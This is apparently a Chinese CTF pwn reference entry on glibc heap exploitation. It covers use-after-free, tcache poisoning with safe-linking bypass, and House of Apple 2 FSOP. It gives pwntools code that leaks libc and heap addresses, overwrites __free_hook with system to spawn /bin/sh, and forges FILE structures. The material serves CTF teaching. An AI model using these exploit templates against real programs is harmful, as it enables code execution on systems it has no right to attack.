---
category: pwn
tags: [heap, uaf, use_after_free, tcache, fastbin, double_free, tcache_poisoning, house_of, 堆利用, 释放后使用, 堆溢出, glibc, safe_linking]
triggers: [heap, uaf, use after free, tcache, fastbin, double free, malloc, free, chunk, heap overflow, heap exploit, tcache poisoning, house of, 堆, 释放后使用]
related: [one_gadget, format_string, ret2libc, shellcode]
---

# Heap 利用与 UAF

## 什么时候用

程序有堆操作（malloc/free）且存在 UAF（Use-After-Free）、double free、堆溢出等漏洞。典型场景：菜单式堆管理程序（add/edit/delete/show），或者 C++ 对象的虚表指针被篡改。

## 前提条件

- **存在堆漏洞**：UAF、double free、堆溢出（off-by-one/off-by-null）
- **知道 glibc 版本**：不同版本的保护机制差异巨大
  - **2.26-2.31**：有 tcache，无 safe-linking，tcache 无 double free 检查（2.29 前）
  - **2.32-2.33**：引入 safe-linking（fd 指针异或混淆），需要堆地址泄露
  - **2.34+**：移除 `__malloc_hook`/`__free_hook`，需用 FSOP/IO_FILE 攻击
- **能泄露 libc 和堆地址**（通常通过 unsorted bin 泄露 libc，tcache/fastbin 泄露堆）

### 关键数据结构

```
Chunk header (malloc_chunk):
+------------------+
|   prev_size      |  (仅当前一个 chunk 空闲时有效)
+------------------+
|   size      |A|M|P|  (A=非主 arena, M=mmap, P=前一个 chunk 在使用中)
+------------------+
|   fd             |  (空闲时：指向下一个空闲 chunk)
|   bk             |  (空闲时：指向上一个空闲 chunk，仅 small/large/unsorted bin)
+------------------+

Bin 分类：
- Tcache (glibc 2.26+)：每线程缓存，64 个 bin(0x20-0x410)，LIFO，每 bin 最多 7 个
- Fastbin：单链表 LIFO，大小 0x20-0x80，不合并
- Unsorted bin：临时存放，排序后分配到 small/large bin
- Small bin：双链表 FIFO，62 个 bin(0x20-0x3F0)
- Large bin：双链表，按大小排序
```

## 攻击步骤

### 1. 泄露 libc 地址（unsorted bin 法）

释放一个大于 fastbin 范围（>0x80）的 chunk 到 unsorted bin，它的 fd/bk 会指向 `main_arena+offset`（即 libc 地址）：

```python
from pwn import *

# 假设菜单式程序：add(idx, size, data), delete(idx), show(idx)
# 先填满 tcache（7 个同大小 chunk）
for i in range(9):
    add(i, 0x90, b'A' * 8)

# 释放 7 个填满 tcache
for i in range(7):
    delete(i)

# 第 8 个进入 unsorted bin
delete(7)

# 利用 UAF 读取 fd（指向 main_arena+96）
show(7)
leaked = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = leaked - (libc.sym['main_arena'] + 96)
log.success(f"libc base: {hex(libc.address)}")
```

### 2. 泄露堆地址（tcache fd 法）

```python
# 释放两个相同大小的 chunk 到 tcache
add(0, 0x20, b'A')
add(1, 0x20, b'B')
delete(0)
delete(1)

# UAF 读取 chunk 1 的 fd（指向 chunk 0）
show(1)
heap_leak = u64(p.recv(6).ljust(8, b'\x00'))

# glibc >= 2.32：fd 被 safe-linking 混淆
# 实际 fd = leaked_fd ^ (chunk_addr >> 12)
# 第一个释放的 chunk 的 fd 是 0（链表末尾），所以 leaked = 0 ^ (addr >> 12)
heap_base = heap_leak << 12  # 近似值（低 12 位为 0）
log.success(f"heap base: {hex(heap_base)}")
```

### 3. Tcache Poisoning（glibc < 2.32）

直接覆写 freed chunk 的 fd 指针，让 malloc 返回任意地址：

```python
target = libc.sym['__free_hook']

# UAF 覆写 fd 为目标地址
delete(0)
edit(0, p64(target))

# 两次 malloc：第一次取出原 chunk，第二次返回 target
add(2, 0x20, b'X')
add(3, 0x20, p64(libc.sym['system']))  # 覆写 __free_hook = system

# 触发
add(4, 0x20, b'/bin/sh\x00')
delete(4)  # free(ptr) -> system("/bin/sh")
```

### 4. Tcache Poisoning（glibc 2.32+，safe-linking）

fd 指针被异或混淆：`stored_fd = real_fd ^ (chunk_addr >> 12)`：

```python
# 需要先泄露堆地址获取 key
fd_key = heap_base >> 12

target = libc.sym['__free_hook']  # 仅 glibc < 2.34
mangled_fd = target ^ fd_key

delete(0)
edit(0, p64(mangled_fd))

add(2, 0x20, b'X')
add(3, 0x20, p64(libc.sym['system']))
```

### 5. glibc 2.34+ 完整攻击（House of Apple 2 / FSOP）

`__free_hook` 已移除，需要通过 IO_FILE 攻击。用 tcache poisoning 覆写 `_IO_list_all`，伪造 FILE 结构体：

```python
# 构造 fake FILE 结构体
io_wfile_jumps = libc.address + libc.sym['_IO_wfile_jumps']
fake_file_addr = heap_base + 0x300  # 已知堆地址

fake_file = flat({
    0x00: b' sh\x00',           # _flags（包含 "sh"，system 会解析）
    0x20: p64(0),                # _IO_write_base = 0
    0x28: p64(1),                # _IO_write_ptr = 1 (> write_base)
    0x88: p64(heap_base + 0x100),  # _lock（可写地址）
    0xa0: p64(fake_file_addr + 0x100),  # _wide_data
    0xd8: p64(io_wfile_jumps),   # vtable = _IO_wfile_jumps
}, filler=b'\x00', length=0x100)

fake_wide_data = flat({
    0x18: p64(0),
    0x30: p64(0),
    0xe0: p64(fake_file_addr + 0x200),  # _wide_vtable
}, filler=b'\x00', length=0x100)

fake_wide_vtable = flat({
    0x68: p64(libc.sym['system']),  # __doallocate -> system
}, filler=b'\x00', length=0x100)

# 用 tcache poisoning 写 fake_file 地址到 _IO_list_all
# 然后 exit() 触发 FSOP -> system(" sh")
```

## 常见坑

- **tcache 满了才会用 fastbin/unsorted bin**：每个 tcache bin 最多 7 个 entry。泄露 libc 时必须先把 tcache 填满（释放 7 个同大小的 chunk），第 8 个才会进 unsorted bin。
- **safe-linking 需要堆泄露**：glibc 2.32+ 的 fd 异或混淆，不能盲写。必须先拿到堆地址算出 key。
- **chunk 对齐检查**：`malloc(): unaligned tcache chunk detected`——目标地址必须 16 字节对齐。
- **unsorted bin 泄露的是 main_arena 偏移**：不同 glibc 版本 `main_arena` 相对 libc 基地址的偏移不同。用 `libc.sym['main_arena']` 或 `__malloc_hook + 0x10`（旧版本常用近似）。
- **UAF 要区分 show 和 edit**：有些题目释放后只能读不能写（或反过来），需要精心规划操作顺序。
- **pwndbg 调试堆**：`heap`、`bins`、`tcache`、`vis` 命令是调试堆布局的核心工具。

## 变体

### Fastbin Dup（double free 绕过）

tcache 2.29+ 有 key 字段防 double free。绕过方法：
- 释放到不同大小的 bin（改 size 字段后 free）
- 改 tcache key 字段后再次 free

### House of 系列概览

| 技术 | 适用 glibc | 核心思路 |
|------|-----------|---------|
| House of Force | < 2.29 | 覆写 top chunk size 为 -1，malloc 到任意地址 |
| House of Spirit | 通用 | 伪造 fake chunk 后 free，下次 malloc 返回伪造地址 |
| House of Orange | < 2.26 | 不需要 free 的堆利用，通过 top chunk shrink |
| House of Einherjar | 通用 | off-by-null 触发后向合并，chunk 重叠 |
| House of Apple 2 | 2.34+ | FSOP via `_IO_wfile_jumps`，替代 hook 覆写 |

### Off-by-One/Off-by-Null

一字节溢出清除下一个 chunk 的 `PREV_INUSE` 位，伪造 `prev_size` 触发后向合并，产生 chunk 重叠。

## 相关技术

- [[one_gadget]] — 堆利用中用 one_gadget 覆写 hook 或 vtable
- [[format_string]] — 另一种实现任意写的方式
- [[ret2libc]] — 堆利用通常也需要泄露 libc
- [[shellcode]] — mprotect 后写 shellcode（seccomp 限制 execve 时用 ORW）
